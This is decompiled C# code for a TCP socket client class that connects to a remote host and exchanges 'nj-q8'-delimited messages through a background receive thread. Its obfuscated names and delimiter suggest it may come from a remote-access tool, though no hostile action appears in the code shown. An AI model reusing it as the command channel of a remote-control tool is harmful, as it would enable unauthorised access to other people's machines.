using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using n.Delegates.T;
using n.My;

namespace n;

public class SocketsClient
{
	public delegate void onConnectEventHandler();

	public delegate void onErrorEventHandler(string Description);

	public delegate void onDataArrivalEventHandler(byte[] Data, int TotalBytes);

	public delegate void onDisconnectEventHandler();

	public delegate void onSendCompleteEventHandler(int DataSize);

	private onConnectEventHandler onConnectEvent;

	private onErrorEventHandler onErrorEvent;

	private onDataArrivalEventHandler onDataArrivalEvent;

	private onDisconnectEventHandler onDisconnectEvent;

	private onSendCompleteEventHandler onSendCompleteEvent;

	private static string response = string.Empty;

	private static int port;

	private static IPHostEntry ipHostInfo;

	private static IPAddress ipAddress;

	private static Socket client = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

	private byte[] Spl;

	public static Thread TH;

	public event onConnectEventHandler onConnect
	{
		[MethodImpl(MethodImplOptions.Synchronized)]
		add
		{
			onConnectEvent = (onConnectEventHandler)Delegate.Combine(onConnectEvent, value);
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		remove
		{
			onConnectEvent = (onConnectEventHandler)Delegate.Remove(onConnectEvent, value);
		}
	}

	public event onErrorEventHandler onError
	{
		[MethodImpl(MethodImplOptions.Synchronized)]
		add
		{
			onErrorEvent = (onErrorEventHandler)Delegate.Combine(onErrorEvent, value);
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		remove
		{
			onErrorEvent = (onErrorEventHandler)Delegate.Remove(onErrorEvent, value);
		}
	}

	public event onDataArrivalEventHandler onDataArrival
	{
		[MethodImpl(MethodImplOptions.Synchronized)]
		add
		{
			onDataArrivalEvent = (onDataArrivalEventHandler)Delegate.Combine(onDataArrivalEvent, value);
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		remove
		{
			onDataArrivalEvent = (onDataArrivalEventHandler)Delegate.Remove(onDataArrivalEvent, value);
		}
	}

	public event onDisconnectEventHandler onDisconnect
	{
		[MethodImpl(MethodImplOptions.Synchronized)]
		add
		{
			onDisconnectEvent = (onDisconnectEventHandler)Delegate.Combine(onDisconnectEvent, value);
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		remove
		{
			onDisconnectEvent = (onDisconnectEventHandler)Delegate.Remove(onDisconnectEvent, value);
		}
	}

	public event onSendCompleteEventHandler onSendComplete
	{
		[MethodImpl(MethodImplOptions.Synchronized)]
		add
		{
			onSendCompleteEvent = (onSendCompleteEventHandler)Delegate.Combine(onSendCompleteEvent, value);
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		remove
		{
			onSendCompleteEvent = (onSendCompleteEventHandler)Delegate.Remove(onSendCompleteEvent, value);
		}
	}

	public SocketsClient()
	{
		Spl = STB("nj-q8");
	}

	public void AT(byte[] D)
	{
		MyProject.MyForms forms = MyProject.Forms;
		Form Frm = (Form)(object)forms.B;
		T.appendText(ref Frm, ref D);
		forms.B = (B)(object)Frm;
	}

	public void Connect(string RemoteHostName, int RemotePort)
	{
		try
		{
			client = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
			port = RemotePort;
			ipHostInfo = Dns.Resolve(RemoteHostName);
			ipAddress = ipHostInfo.AddressList[0];
			IPEndPoint remoteEP = new IPEndPoint(ipAddress, port);
			client.BeginConnect(remoteEP, sockConnected, client);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			onDisconnectEvent?.Invoke();
			ProjectData.ClearProjectError();
		}
	}

	public void SendData(byte[] Data)
	{
		try
		{
			MemoryStream memoryStream = new MemoryStream();
			memoryStream.Write(Data, 0, Data.Length);
			memoryStream.Write(Spl, 0, Spl.Length);
			memoryStream.ToArray();
			client.Send(memoryStream.ToArray(), memoryStream.ToArray().Length, SocketFlags.None);
			memoryStream.Dispose();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void Disconnect()
	{
		try
		{
			client.Shutdown(SocketShutdown.Both);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			client.Close();
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	public byte[] STB(string Data)
	{
		return Encoding.Default.GetBytes(Data);
	}

	public string BTS(byte[] Data)
	{
		return Encoding.Default.GetString(Data);
	}

	private void sockConnected(IAsyncResult ar)
	{
		try
		{
			if (!client.Connected)
			{
				onDisconnectEvent?.Invoke();
				return;
			}
			client.ReceiveBufferSize = 99999;
			client.ReceiveTimeout = -1;
			client.SendTimeout = -1;
			while (true)
			{
				Thread.Sleep(1);
				if (TH == null)
				{
					TH = new Thread(DDD);
				}
				if ((TH.ThreadState == ThreadState.Aborted) | (TH.ThreadState == ThreadState.Unstarted) | (TH.ThreadState == ThreadState.Stopped))
				{
					break;
				}
				if (TH.ThreadState == ThreadState.Running)
				{
					TH.Abort();
				}
			}
			TH = new Thread(DDD);
			TH.Start();
			onConnectEvent?.Invoke();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			onDisconnectEvent?.Invoke();
			ProjectData.ClearProjectError();
		}
	}

	public Array fx(ref byte[] buf)
	{
		MemoryStream memoryStream = new MemoryStream();
		string text = "nj-q8";
		byte[] array = new byte[5];
		checked
		{
			int num = buf.Length - text.Length;
			for (int i = 0; i <= num; i++)
			{
				array[0] = buf[i];
				array[1] = buf[i + 1];
				array[2] = buf[i + 2];
				array[3] = buf[i + 3];
				array[4] = buf[i + 4];
				if (Operators.CompareString(Encoding.Default.GetString(array), text, false) == 0)
				{
					memoryStream.Dispose();
					memoryStream = new MemoryStream();
					MemoryStream memoryStream2 = new MemoryStream();
					memoryStream.Write(buf, 0, i);
					if (i + 5 == buf.Length)
					{
						return new object[1] { memoryStream.ToArray() };
					}
					memoryStream2.Write(buf, i + 5, buf.Length - (i + 5));
					return new object[2]
					{
						memoryStream.ToArray(),
						memoryStream2.ToArray()
					};
				}
			}
			Array result = default(Array);
			return result;
		}
	}

	public void DDD()
	{
		MemoryStream memoryStream = new MemoryStream();
		checked
		{
			int num = default(int);
			while (true)
			{
				num++;
				Thread.Sleep(5);
				try
				{
					if (num > 200)
					{
						try
						{
							if (client.Poll(-1, SelectMode.SelectRead) & (client.Available <= 0))
							{
								MyProject.Forms.B.Dis();
								break;
							}
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							MyProject.Forms.B.Dis();
							ProjectData.ClearProjectError();
							break;
						}
						num = 0;
					}
					if (client.Available <= 0)
					{
						continue;
					}
					byte[] array = new byte[client.Available - 1 + 1];
					client.Receive(array, array.Length, SocketFlags.None);
					memoryStream.Write(array, 0, array.Length);
					while (Strings.InStr(BTS(memoryStream.ToArray()), "nj-q8", (CompareMethod)0) > 0)
					{
						byte[] buf = memoryStream.ToArray();
						Array array2 = fx(ref buf);
						Thread thread = new Thread(delegate(object a0)
						{
							EFE((byte[])a0);
						});
						thread.Start(RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet((object)array2, new object[1] { 0 }, (string[])null)));
						memoryStream = new MemoryStream();
						if (array2.Length == 2)
						{
							memoryStream.Write((byte[])NewLateBinding.LateIndexGet((object)array2, new object[1] { 1 }, (string[])null), 0, Conversions.ToInteger(NewLateBinding.LateGet(NewLateBinding.LateIndexGet((object)array2, new object[1] { 1 }, (string[])null), (Type)null, "length", new object[0], (string[])null, (Type[])null, (bool[])null)));
							continue;
						}
						break;
					}
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					try
					{
						MyProject.Forms.B.Dis();
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
					}
					ProjectData.ClearProjectError();
					break;
				}
			}
		}
	}

	public void EFE(byte[] B)
	{
		onDataArrivalEvent?.Invoke(B, checked(B.Length - 1));
	}

	public bool Connected()
	{
		try
		{
			return client.Connected;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
	}
}
